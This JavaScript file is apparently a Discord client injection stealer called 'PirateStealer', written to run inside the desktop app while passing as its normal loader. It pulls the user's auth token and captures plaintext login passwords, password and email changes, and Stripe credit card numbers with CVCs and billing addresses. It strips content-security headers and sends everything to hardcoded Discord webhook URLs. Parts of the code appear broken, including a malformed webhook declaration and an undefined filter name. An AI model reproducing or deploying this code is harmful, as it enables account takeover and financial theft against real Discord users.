const fs = require("fs"),
    path = require("path"),
    {
        BrowserWindow: BrowserWindow,
        session: session
    } = require("electron"),
    querystring = require("querystring"),
    os = require("os");
var webhook = "https://discord.com/api/webhooks/947230144886603796/Q_Gd5dblBNsAkZs4iR964zX6fBLXaG7H-WfjvJuQsCspO0SMzggpp_QEVgb5gsUb96MQ", "https://discord.com/api/webhooks/946843033129848912/7VI4rLifCowgKW-LOLJS7eBKG-gIDbSshR3G3EoOcaHRZdvBTI22-XS0CbwKh0o8Z-HN"
const computerName = os.hostname(),
    discordInstall = `${__dirname}`,
    EvalToken = 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;';
String.prototype.insert = function (e, t) {
    return e > 0 ? this.substring(0, e) + t + this.substr(e) : t + this
};
const config = {
    "logout": "instant",
    "logout-notify": true,
    "init-notify": true,
    "embed-color": "0000000",
    "disable-qr-code": true
};

function FirstTime() {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`${EvalToken}`, !0).then(e => {
        if ("true" == config["init-notify"] && fs.existsSync(path.join(__dirname, "init")))
            if (fs.rmdirSync(path.join(__dirname, "init")), null == e || null == e || "" == e) {
                var t = {
                    username: "PirateStealer",
                    content: "",
                    embeds: [{
                        title: "Discord Initalized (User not Logged in)",
                        color: config["embed-color"],
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }],
                        author: {
                            name: "PirateStealer"
                        },
                        footer: {
                            text: "PirateStealer"
                        }
                    }]
                };
                SendToWebhook(JSON.stringify(t))
            } else {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${e}"),xmlHttp.send(null),xmlHttp.responseText;\n                    `, !0).then(t => {
                    const n = JSON.parse(t);
                    var r = {
                        username: "PirateStealer",
                        content: "",
                        embeds: [{
                            title: "Discord Initalized",
                            description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**] (https://ctf.surf/raw/" + e + ")",
                            color: config["embed-color"],
                            fields: [{
                                name: "Info",
                                value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                                inline: !1
                            }, {
                                name: "Username",
                                value: `\`${n.username}#${n.discriminator}\``,
                                inline: !0
                            }, {
                                name: "ID",
                                value: `\`${n.id}\``,
                                inline: !0
                            }, {
                                name: "Badges",
                                value: `${GetBadges(n.flags)}`,
                                inline: !1
                            }, {
                                name: "Token",
                                value: `\`\`\`${e}\`\`\``,
                                inline: !1
                            }],
                            author: {
                                name: "PirateStealer"
                            },
                            footer: {
                                text: "PirateStealer"
                            },
                            thumbnail: {
                                url: `https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`
                            }
                        }]
                    };
                    SendToWebhook(JSON.stringify(r))
                })
            } if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return !0;
        if (fs.rmdirSync(path.join(__dirname, "PirateStealerBTW")), "false" != config.logout || "%LOGOUT%" == config.logout) {
            if ("true" == config["logout-notify"])
                if (null == e || null == e || "" == e) {
                    t = {
                        username: "PirateStealer",
                        content: "",
                        embeds: [{
                            title: "User log out (User not Logged in before)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Info",
                                value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                                inline: !1
                            }],
                            author: {
                                name: "PirateStealer"
                            },
                            footer: {
                                text: "PirateStealer"
                            }
                        }]
                    };
                    SendToWebhook(JSON.stringify(t))
                } else {
                    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${e}"),xmlHttp.send(null),xmlHttp.responseText;\n                    `, !0).then(t => {
                        const n = JSON.parse(t);
                        var r = {
                            username: "PirateStealer",
                            content: "",
                            embeds: [{
                                title: "User got logged out",
                                description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + e + ")",
                                color: config["embed-color"],
                                fields: [{
                                    name: "Info",
                                    value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                                    inline: !1
                                }, {
                                    name: "Username",
                                    value: `\`${n.username}#${n.discriminator}\``,
                                    inline: !0
                                }, {
                                    name: "ID",
                                    value: `\`${n.id}\``,
                                    inline: !0
                                }, {
                                    name: "Badges",
                                    value: `${GetBadges(n.flags)}`,
                                    inline: !1
                                }, {
                                    name: "Token",
                                    value: `\`\`\`${e}\`\`\``,
                                    inline: !1
                                }],
                                author: {
                                    name: "PirateStealer"
                                },
                                footer: {
                                    text: "PirateStealer"
                                },
                                thumbnail: {
                                    url: `https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`
                                }
                            }]
                        };
                        SendToWebhook(JSON.stringify(r))
                    })
                } BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', !0).then(e => {})
        }
        return !1
    })
}
session.defaultSession.webRequest.onHeadersReceived((e, t) => {
    e.url.startsWith(webhook) ? e.url.includes("discord.com") ? t({
        responseHeaders: Object.assign({
            "Access-Control-Allow-Headers": "*"
        }, e.responseHeaders)
    }) : t({
        responseHeaders: Object.assign({
            "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*"
        }, e.responseHeaders)
    }) : (delete e.responseHeaders["content-security-policy"], delete e.responseHeaders["content-security-policy-report-only"], t({
        responseHeaders: {
            ...e.responseHeaders,
            "Access-Control-Allow-Headers": "*"
        }
    }))
});
const Filter = {
    urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https:/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https:/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https:/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.ggusers/@me", "https://discordapp.com/api/v*/users/@me", "https:/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https:/auth/login", "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
    if (e.url.endsWith("login") && 200 == e.statusCode) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),
            n = t.login,
            r = t.password;
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
            Login(n, r, e)
        })
    }
    if (e.url.endsWith("users/@me") && 200 == e.statusCode && "PATCH" == e.method) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
        if (null != t.password && null != t.password && "" != t.password) {
            if (null != t.new_password && null != t.new_password && "" != t.new_password) {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
                    ChangePassword(t.password, t.new_password, e)
                })
            }
            if (null != t.email && null != t.email && "" != t.email) {
                BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
                    ChangeEmail(t.email, t.password, e)
                })
            }
        }
    }
    if (e.url.endsWith("tokens")) {
        const t = BrowserWindow.getAllWindows()[0],
            n = querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));
        t.webContents.executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', !0).then(e => {
            CreditCardAdded(n["card[number]"], n["card[cvc]"], n["card[exp_month]"], n["card[exp_year]"], n["card[address_line1]"], n["card[address_city]"], n["card[address_state]"], n["card[address_zip]"], n["card[address_country]"], e)
        })
    }
}), module.exports = require("./core.asar");